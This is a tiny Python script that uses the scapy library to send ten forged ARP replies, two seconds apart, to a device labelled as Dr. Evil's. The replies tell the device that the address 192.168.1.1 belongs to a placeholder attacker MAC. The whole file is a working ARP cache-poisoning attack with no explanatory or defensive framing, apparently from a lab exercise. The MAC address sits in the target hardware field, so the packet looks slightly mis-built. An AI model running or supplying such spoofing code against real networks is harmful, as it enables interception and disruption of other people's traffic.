from scapy.all import *
import time

op=1
victim = '192.168.1.3'    # Dr. Evil's device's IP address
spoof = '192.168.1.1'
mac = 'xx:xx:xx:xx:xx:xx' #attacker's MAC address

arp = ARP(op=op, psrc=spoof, pdst=victim, hwdst=mac)

i= 0
while (i < 10):
   send(arp)
   time.sleep(2)
   i = i+1